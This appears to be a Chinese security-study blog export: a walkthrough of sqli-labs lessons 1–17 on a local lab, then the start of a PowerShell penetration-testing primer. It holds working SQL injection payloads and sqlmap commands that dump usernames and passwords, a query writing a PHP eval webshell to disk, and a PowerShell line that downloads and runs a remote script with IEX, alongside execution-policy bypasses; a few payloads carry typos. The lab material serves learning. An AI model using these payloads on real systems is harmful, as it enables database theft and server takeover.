<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security --tables --batch</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205190557.png" alt></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users --batch</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205190649.png" alt></p>
<p><code>python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security -T users -C password,username --dump --batch</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205192706.png" alt></p>
<h5 id="Less-2-（基于错误的GET整型注入）"><a href="#Less-2-（基于错误的GET整型注入）" class="headerlink" title="Less-2 （基于错误的GET整型注入）"></a>Less-2 （基于错误的GET整型注入）</h5><p>数字型注入，去掉单引号即可。</p>
<p>构造同Less-1</p>
<h5 id="Less-3-（基于错误的GET单引号变形字符型注入）"><a href="#Less-3-（基于错误的GET单引号变形字符型注入）" class="headerlink" title="Less-3 （基于错误的GET单引号变形字符型注入）"></a>Less-3 （基于错误的GET单引号变形字符型注入）</h5><p>?id=1’) %23 回显正常</p>
<p>构造同Less-1</p>
<h5 id="Less-4（基于错误的GET双引号字符型注入）"><a href="#Less-4（基于错误的GET双引号字符型注入）" class="headerlink" title="Less-4（基于错误的GET双引号字符型注入）"></a>Less-4（基于错误的GET双引号字符型注入）</h5><p>?id=1”)%23 回显正常</p>
<p>构造同Less-01</p>
<h5 id="Less-5（双注入GET单引号字符型注入）"><a href="#Less-5（双注入GET单引号字符型注入）" class="headerlink" title="Less-5（双注入GET单引号字符型注入）"></a>Less-5（双注入GET单引号字符型注入）</h5><p><strong>爆库名</strong></p>
<p><code>?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select database()),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206132510.png" alt></p>
<p><strong>爆表名</strong></p>
<p><code>?id=1&#39; union select count(*),1, concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206132607.png" alt></p>
<p><strong>更换Limit后的数字即可查出其他表名</strong></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206132652.png" alt></p>
<p><strong>爆user表列名</strong></p>
<p><code>?id=1&#39;  union select count(*),1, concat(&#39;~&#39;,(select column_namefrom information_schema.tables where table_schema=&#39;security&#39;   and table_name=&#39;users&#39; limit 0,1),&#39;~&#39;,floor(rand()2)) as a from information_schema gruop by a %23</code></p>
<p><strong>爆username password内容</strong></p>
<p><code>?id=1&#39;union select count(*),1, concat(&#39;~&#39;,(select username from users limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206133237.png" alt></p>
<p><code>?id=1&#39;union select count(*),1, concat(&#39;~&#39;,(select password from users limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a  %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206133320.png" alt></p>
<h5 id="Less-6-双注入GET双引号字符型注入）"><a href="#Less-6-双注入GET双引号字符型注入）" class="headerlink" title="Less-6 (双注入GET双引号字符型注入）"></a>Less-6 (双注入GET双引号字符型注入）</h5><p>将单引号换成双引号即可</p>
<p>构造同上</p>
<h5 id="Less-7-导出文件GET字符型注入）"><a href="#Less-7-导出文件GET字符型注入）" class="headerlink" title="Less-7(导出文件GET字符型注入）"></a>Less-7(导出文件GET字符型注入）</h5><p>我们首先需要打开phpstudy\PHPTutorial\MySQL\my.ini文件，在其中加上一句：secure_file_priv=“/”。</p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206122518.png" alt></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206120820.png" alt></p>
<p>我们需要用到两个函数：</p>
<p><strong>load_file()：</strong>读取本地文件</p>
<p><strong>into outfile()</strong> 写文件 （路径需要使用双斜线）</p>
<p>我们首先判断注入点：</p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206121046.png" alt></p>
<p>然后我们使用outfile函数将一句话木马写入文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;crow&quot;]);?&gt;&#39; into outfile &quot;D:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\Less-7\\test.php&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206123636.png" alt></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206123628.png" alt></p>
<p>之后我们使用中国菜刀连接即可。 </p>
<h5 id="Less-8-基于布尔的盲注）"><a href="#Less-8-基于布尔的盲注）" class="headerlink" title="Less-8 (基于布尔的盲注）"></a>Less-8 (基于布尔的盲注）</h5><p><strong>爆数据库长度</strong></p>
<p><code>?id=1&#39; and (length(database())) = 8 %23 #数据库长度为8</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205195014.png" alt></p>
<p>我们任意修改长度，页面不回显</p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205195102.png" alt></p>
<p><strong>爆库名</strong></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,1,1))) = 115 %23 # s</code></p>
<p><code>?id=1&#39;and(ascii(substr((select database()),2,1)))=101 %23 #e</code></p>
<p><code>?id=1&#39;and(ascii(substr((select database()),3,1)))=99 %23 #c</code></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,4,1))) = 117 --+ #u</code></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,5,1))) = 114 --+ #r</code></p>
<p>   <code>and (ascii(substr((select database()) ,6,1))) = 105 --+    #i</code></p>
<p><code>and (ascii(substr((select database()) ,7,1))) = 116 --+   #t</code></p>
<p><code>?id=1&#39; and (ascii(substr((select database()) ,8,1))) = 121 --+  #y</code></p>
<p><strong>爆表名长度</strong></p>
<p><code>?id=1&#39; and (length((select table_name from information_schema.tables  where table_schema=database() limit 0,1)))=6 %23</code></p>
<p>类推以上即可：</p>
<h5 id="Less-9（基于时间的GET单引号盲注）"><a href="#Less-9（基于时间的GET单引号盲注）" class="headerlink" title="Less-9（基于时间的GET单引号盲注）"></a>Less-9（基于时间的GET单引号盲注）</h5><p><code>?id=1&#39; and sleep(5) %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205194242.png" alt></p>
<p><code>?id=1&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200205194753.png" alt></p>
<p>接下来使用sqlmap自动化注入</p>
<p><strong>爆数据库名：</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql <span class="params">--dbs</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><strong>爆表名：</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security <span class="params">--tables</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><strong>爆列名</strong>：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security -T users <span class="params">--column</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<p><strong>爆内容 ：</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http:<span class="string">//localhost</span><span class="function">:8088</span>/sqlilabs/Less-9/?id=1 <span class="params">--technique</span> T <span class="params">--dbms</span> mysql -D security -T users -C username,password <span class="params">--dump</span> <span class="params">--batch</span></span><br></pre></td></tr></table></figure>

<h5 id="Less-10-基于时间的双引号盲注）"><a href="#Less-10-基于时间的双引号盲注）" class="headerlink" title="Less-10 (基于时间的双引号盲注）"></a>Less-10 (基于时间的双引号盲注）</h5><p><code>?id=1&quot; and sleep(5) %23</code></p>
<p>同上</p>
<h5 id="Less-11-基于错误的POST型单引号字符型注入）"><a href="#Less-11-基于错误的POST型单引号字符型注入）" class="headerlink" title="Less-11(基于错误的POST型单引号字符型注入）"></a>Less-11(基于错误的POST型单引号字符型注入）</h5><p>提交方式改为POST，使用burp进行抓包修改。</p>
<p><code>uname=admin&#39; and 1=1 %23 &amp;passwd=admin&amp;submit=Submit  #成功登录</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206125708.png" alt></p>
<p><code>uname=admin&#39; and 1=2  %23&amp; passwd=admin&amp;submit=Submit #不能登录</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/%5CQQ%E6%88%AA%E5%9B%BE20200206125727.png" alt></p>
<p>存在报错型注入，我们使用extractvalue()函数。</p>
<p><strong>爆数据库</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e)) %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130037.png" alt></p>
<p><strong>爆表名</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select  group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e)) %23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130124.png" alt></p>
<p><strong>爆列名</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_shcema.columns where table_name=&#39;users&#39;),0x7e))%23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130709.png" alt></p>
<p><strong>爆用户名密码</strong></p>
<p><code>uname=admin&#39; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</code></p>
<p><img src="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/QQ%E6%88%AA%E5%9B%BE20200206130537.png" alt></p>
<p>sqlmap自动化注入：</p>
<p>复制Burpsuite截断的HTTP请求数据包到文本文件中，使用Sqlmap -r 文件路径 -p 指定探测参数。</p>
<h5 id="Less-12-基于错误的双引号POST型字符型变形的注入）"><a href="#Less-12-基于错误的双引号POST型字符型变形的注入）" class="headerlink" title="Less-12(基于错误的双引号POST型字符型变形的注入）"></a>Less-12(基于错误的双引号POST型字符型变形的注入）</h5><p><strong>换成双引号即可；</strong></p>
<p><strong>爆数据库名</strong>：</p>
<p><code>uname=admin&quot; and extractvalue(1,concat(0x7e,(select database(),0x7e)))  &quot;%23</code></p>
<p><strong>爆表名</strong>：</p>
<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))  and &quot;</code> </p>
<p><strong>爆列名</strong>：</p>
<p><code>uname=admin&quot;  and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)))  and &quot;</code><br><strong>爆用户名密码：</strong></p>
<p><code>uname=admin“ and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users),0x7e))%23</code></p>
<h5 id="Less-13-POST单引号变形双注入）"><a href="#Less-13-POST单引号变形双注入）" class="headerlink" title="Less-13(POST单引号变形双注入）"></a>Less-13(POST单引号变形双注入）</h5><p><strong>floor 报错注入</strong></p>
<p><code>1&#39;) union select count(*),concat_ws(&#39;~&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><code>1&#39;) union select count(*),concat_ws(&#39;:&#39;,(select user()),(select database()),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><strong>爆表名</strong></p>
<p><code>&#39;) union select count(*),concat_ws(&#39;++&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><strong>爆列名</strong></p>
<p><code>&#39;) union select count(*),concat_ws(&#39;+&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<p><strong>爆数据</strong></p>
<p><code>&#39;) union select count(*),concat_ws(&#39;;&#39;,(select username from users limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a#</code></p>
<h5 id="Less-14-POST双引号变形双注入）"><a href="#Less-14-POST双引号变形双注入）" class="headerlink" title="Less-14(POST双引号变形双注入）"></a>Less-14(POST双引号变形双注入）</h5><p>将单引号闭合换成双引号即可。</p>
<p>过程同上。</p>
<h5 id="Less-15-基于bool型-时间延迟单引号POST型盲注）"><a href="#Less-15-基于bool型-时间延迟单引号POST型盲注）" class="headerlink" title="Less-15(基于bool型/时间延迟单引号POST型盲注）"></a>Less-15(基于bool型/时间延迟单引号POST型盲注）</h5><p>使用延时注入</p>
<p><code>admin&#39; and if(ascii(substr(database(),1,1))&gt;115,1,sleep(5)) #</code></p>
<p>逐个判断即可；</p>
<h5 id="Less-16-基于bool型-时间延迟双引号POST型盲注）"><a href="#Less-16-基于bool型-时间延迟双引号POST型盲注）" class="headerlink" title="Less-16(基于bool型/时间延迟双引号POST型盲注）"></a>Less-16(基于bool型/时间延迟双引号POST型盲注）</h5><p>根据源码我们可以知道闭合方法： 使用”）进行闭合</p>
<p>使用延时注入</p>
<p>同上。</p>
<h5 id="Less-17-基于错误的更新查询POST注入）"><a href="#Less-17-基于错误的更新查询POST注入）" class="headerlink" title="Less-17(基于错误的更新查询POST注入）"></a>Less-17(基于错误的更新查询POST注入）</h5><p><strong>爆数据库版本</strong></p>
<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,version(),0x5c),1))#submit=submit</code></p>
<p><strong>爆表名</strong></p>
<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 3,1),0x5c),1))#submit=submit</code></p>
<p><strong>爆字段名</strong></p>
<p><code>uname=admin&amp;passwd=1&#39; and (updatexml(1,concat(0x5c,(select password from (select password from users where username=&#39;admin&#39;)aa),0x5c),1))#submit=submit</code></p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://blog.csdn.net/SKI_12/article/details/56279676" target="_blank" rel="noopener">https://blog.csdn.net/SKI_12/article/details/56279676</a></p>
<p><a href="https://www.cnblogs.com/ssooking/p/8137597.html" target="_blank" rel="noopener">https://www.cnblogs.com/ssooking/p/8137597.html</a></p>
<p><a href="https://blog.csdn.net/qq_41420747/article/details/81836327" target="_blank" rel="noopener">https://blog.csdn.net/qq_41420747/article/details/81836327</a></p>
]]></content>
      <categories>
        <category>web漏洞学习</category>
      </categories>
      <tags>
        <tag>SQL注入学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Powershell渗透学习</title>
    <url>/2020/07/21/powershell-shen-tou-xue-xi/</url>
    <content><![CDATA[<h2 id="Powershell渗透学习"><a href="#Powershell渗透学习" class="headerlink" title="Powershell渗透学习"></a>Powershell渗透学习</h2><p>[TOC]</p>
<h3 id="powershell渗透基础"><a href="#powershell渗透基础" class="headerlink" title="powershell渗透基础"></a>powershell渗透基础</h3><h4 id="powershell简介"><a href="#powershell简介" class="headerlink" title="powershell简介"></a>powershell简介</h4><p>​                PowerShell是一种基于任务的命令行解释器和脚本环境，可以说是一种强大的shell,如同linux的bash,专为系统管理员而设计，以.NET框架为平台，Windows PowerShell帮助IT专业人员和超级用户控制和自动化管理Windows操作系统和运行在操作系统上的应用。<strong>现被更广泛用于渗透测试等方面，在不需要写入磁盘的情况下执行命令，也可以逃避Anti-Virus检测。</strong></p>
<p><strong>注:</strong>powershell只能针对win7以后的系统使用,</p>
<p><strong>为什么要学powershell</strong></p>
<p>​        对于我们渗透测试人员来说，PowerShell给我们提供了一个非常强大的shell和脚本环境。现在我们的渗透目标上都已经默认安装了PowerShell（win7以后，PowerShell已经默认集成在操作系统上），这给我们提供了一个强大的后渗透利用工具，给予我们很高的权限和广阔的攻击面。</p>
<h5 id="powershell的优点"><a href="#powershell的优点" class="headerlink" title="powershell的优点"></a>powershell的优点</h5><ul>
<li>易学</li>
<li>基于.NET框架</li>
<li>操作系统信任</li>
<li>提供win系列操作系统的几乎一切访问权限</li>
<li>win7之后默认安装</li>
<li>面向对象</li>
<li>ISE编程接口</li>
</ul>
<h5 id="常见的Powershell攻击工具"><a href="#常见的Powershell攻击工具" class="headerlink" title="常见的Powershell攻击工具"></a>常见的Powershell攻击工具</h5><ul>
<li>PowerShell：这是众多PowerShell攻击工具中被广泛使用的PowerShell后期的漏洞利用框架，常用来进行信息探测，特权提升，凭证窃取，持久化等操作。</li>
<li>Nishang：基于PowerShell的渗透测试专用工具，集成了框架，脚本和各种Payload，包含下载和执行，键盘记录，DNS，延时命令等脚本。</li>
<li>Empire：基于PowerShell的远程控制木马，可以从凭证数据库中导出和跟踪凭证信息，常用于提供前期漏洞利用的集成模块，信息探测，凭证窃取，持久化控制。</li>
<li>PowerCat：PowerShell版的NetCat，有着网络工具中的”瑞士军刀”美誉，它能通过TCP和UDP在网络中读取数据。通过与其他工具结合和重定向，读者可以在脚本中以多种方式使用它</li>
</ul>
<h4 id="powershell语法基础"><a href="#powershell语法基础" class="headerlink" title="powershell语法基础"></a>powershell语法基础</h4><p>网站学习:<a href="http://www.pstips.net/" target="_blank" rel="noopener">http://www.pstips.net/</a></p>
<p>推荐文章:<a href="https://www.anquanke.com/post/id/87976" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87976</a> 讲的很细。</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="string">|管道符的作用是将一个命令的输出作为另一个命令的输入</span></span><br><span class="line">;分号用来连续执行系统命令</span><br><span class="line"><span class="meta">&amp;是调用操作符，它允许你执行命令，脚本或函数</span></span><br><span class="line">双引号可以替换内部变量</span><br><span class="line">双引号里的双引号，单引号里的单引号，写两遍输出</span><br></pre></td></tr></table></figure>

<h5 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h5><p><strong>运输符</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">· &gt;:将输出保存到指定文件中（用法：<span class="built_in">Get-Process</span>&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· &gt;&gt;:将脚本的输出追加到指定文件中（用法：test.ps1&gt;&gt;output.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;:将错误输出到指定文件中（<span class="built_in">Get-Porcess</span> none <span class="number">2</span>&gt;Errors.txt）</span><br><span class="line"></span><br><span class="line">· <span class="number">2</span>&gt;&gt;:将错误追加到指定文件中（<span class="built_in">Get-Process</span> none <span class="number">2</span>&gt; logs<span class="literal">-Errors</span>.txt）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-eq</span>:等于运算符（用法：<span class="variable">$var1</span> –eq <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-gt</span>:大于运算符（用法：<span class="variable">$var1</span> –gt <span class="variable">$var2</span>，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-match</span>:匹配运算符，搜索字符串是否在文中出现（用法：<span class="variable">$Text</span> –match <span class="variable">$string</span>返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-replace</span>:替换字符串（用法：<span class="variable">$Text</span> –replace 被替换的字符,替换的字符，返回真或假）</span><br><span class="line"></span><br><span class="line">· <span class="operator">-in</span>：测试一个字符或数字是否出现在文本中或列表中，声明列表直接使用（）</span><br></pre></td></tr></table></figure>

<p><strong>数组</strong></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$Array</span> = value1, value2, value3</span></span><br></pre></td></tr></table></figure>

<p><strong>语句</strong></p>
<ul>
<li>条件语句</li>
</ul>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">If</span><span class="params">(<span class="variable">$var</span> &#123;comparison_statement&#125; <span class="variable">$var2</span>)</span></span> &#123;What_To_Do&#125;</span><br><span class="line">Else &#123;what_to_if_not&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>循环语句</li>
</ul>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span><span class="comment">()</span> &#123;&#125;</span><br><span class="line"><span class="keyword">Do</span> &#123;&#125; <span class="keyword">While</span><span class="comment">()</span></span><br><span class="line">For<span class="comment">(;;;)</span> &#123;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h5><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">使用powershell满足一个标椎动词-名词组合，来帮助我们更快理解。</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-<span class="keyword">Alias</span> -<span class="type">name</span> dir 查看别名</span><br><span class="line"></span><br><span class="line">    Ls env 查看当前环境变量</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-ExecutionPolicy 查看当前执行策略</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span>-ExecutionPolicy 设置执行的策略</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Host 查看powershell版本</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Content 查看文件内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Content test.txt  显示文本内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Set</span>-Content test.txt-<span class="keyword">Value</span> "hello,word" 设置文本内容</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-Process  查看当前服务列表</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-<span class="keyword">Location</span> 获取当前位置</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Get</span>-WmiObject -<span class="keyword">Class</span> Win32_ComputerSystem |<span class="keyword">Select</span>-<span class="keyword">object</span> -ExpandProperty UserName 查看登录到物理机的用户</span><br></pre></td></tr></table></figure>

<h4 id="cmdlets说明"><a href="#cmdlets说明" class="headerlink" title="cmdlets说明"></a>cmdlets说明</h4><p><strong>Cmdlets</strong>是PowerShell的非常重要的内部命令集。</p>
<p><strong>Cmdlet</strong>是以.NET类实例形式存在的命令。</p>
<p>它并不是简单的可执行文件，它有很多属性，这些属性用来指定输入参数或者使用管道来管理重定向。</p>
<p>Cmdlets可以用任何.NET语言来编写，也可以用PowerShell脚本语言来编写。我们可以通过输入“Get-Command”可以显示可用的Cmdlets命令。</p>
<p>输入“Get-Command”，这将返回所有可用的命令</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/QQ%E6%88%AA%E5%9B%BE20200720143951.png" alt></p>
<h5 id="渗透中常用的cmdlets命令"><a href="#渗透中常用的cmdlets命令" class="headerlink" title="渗透中常用的cmdlets命令"></a>渗透中常用的cmdlets命令</h5><p>查看start-process的帮助文档，</p>
<p><code>Get-Help Start-Process</code>，</p>
<p>如图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/QQ%E6%88%AA%E5%9B%BE20200720144622.png" alt></p>
<p>我们也可以使用Get-Process命令来获取指定的进程。这个命令在后渗透中也很有用而且经常用到，可以用来获取进程的ID，比如获取资源管理器的ID，如图：</p>
<p><img src="/2020/07/21/powershell-shen-tou-xue-xi/QQ%E6%88%AA%E5%9B%BE20200720144954.png" alt></p>
<p><strong>常用的cmdlets的命令</strong></p>
<ul>
<li>Copy a file: Copy-Item source_file destination_file</li>
<li>Move a file: Move-Item source_file destination_file</li>
<li>Get Services: Get-Service</li>
<li>Formatting output: Get-Process l Format-List –property name</li>
<li>Get hash (SHA1) of a file: Get-FileHash –Algorithm SHA1 file</li>
<li>Get-Content</li>
<li>Get-Location</li>
<li>start-process </li>
</ul>
<h4 id="powershell执行策略"><a href="#powershell执行策略" class="headerlink" title="powershell执行策略"></a>powershell执行策略</h4><table>
<thead>
<tr>
<th>名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Restricted</td>
<td>受限制的，可以执行单个的命令，但是不能执行脚本Windows 8, Windows Server 2012, and Windows 8.1中默认就是这种策略，所以是不能执行脚本的，执行就会报错，那么如何才能执行呢？Set-ExecutionPolicy -ExecutionPolicy Bypass就是设置策略为Bypass这样就可以执行脚本了。</td>
</tr>
<tr>
<td>AllSigned</td>
<td>AllSigned 执行策略允许执行所有具有数字签名的脚本</td>
</tr>
<tr>
<td>RemoteSigned</td>
<td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td>
</tr>
<tr>
<td>Unrestricted</td>
<td>这是一种比较宽容的策略，允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示。需要你确认是否执行脚本</td>
</tr>
<tr>
<td>Bypass</td>
<td>Bypass 执行策略对脚本的执行不设任何的限制，任何脚本都可以执行，并且不会有安全性提示。</td>
</tr>
<tr>
<td>Undefined</td>
<td>Undefined 表示没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略。</td>
</tr>
</tbody></table>
<h5 id="绕过策略的常见方法"><a href="#绕过策略的常见方法" class="headerlink" title="绕过策略的常见方法"></a>绕过策略的常见方法</h5><ul>
<li>本地读取然后通过管道符运行</li>
</ul>
<p><code>powershell get-content test.ps1 | powershell -noprofile -</code></p>
<ul>
<li>远程下载并通过IEX运行脚本</li>
</ul>
<p><code>powershell -c &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://xxx.xxx.xxx/a.ps1&#39;)&quot;</code></p>
<ul>
<li>Bypass执行策略绕过</li>
</ul>
<p><code>powershell -executionpolicy bypass -File ./a.ps1</code></p>
<ul>
<li>Unrestricted执行策略标志</li>
</ul>
<p><code>powershell -executionpolicy unrestricted -File ./a.ps1</code></p>
<p>当运行一个从网上下载的未签名的脚本时，会给出权限提示</p>
<p><strong>注:</strong></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">Invoke-Expression（IEX的别名）：用来把字符串当作命令执行。</span><br><span class="line"></span><br><span class="line">WindowStyle Hidden（-w Hidden）：隐藏窗口</span><br><span class="line"></span><br><span class="line">Nonlnteractive（-NonI）：非交互模式，PowerShell不为用户提供交互的提示。</span><br><span class="line"></span><br><span class="line"><span class="keyword">NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">Noexit（-Noe）：执行后不退出Shell。</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword">EncodedCommand（-enc）: </span>接受<span class="keyword">base64 </span>encode的字符串编码，避免一些解析问题</span><br></pre></td></tr></table></figure>

<h3 id="powershell渗透测试框架Powersploit"><a href="#powershell渗透测试框架Powersploit" class="headerlink" title="powershell渗透测试框架Powersploit"></a>powershell渗透测试框架Powersploit</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>PowerShell是一款基于PowerShell的后渗透(Post-Exploitation)框架软件</p>
<p>其github地址为 <a href="https://github.com/mattifestation/PowerSploit.git" target="_blank" rel="noopener">https://github.com/mattifestation/PowerSploit.git</a></p>
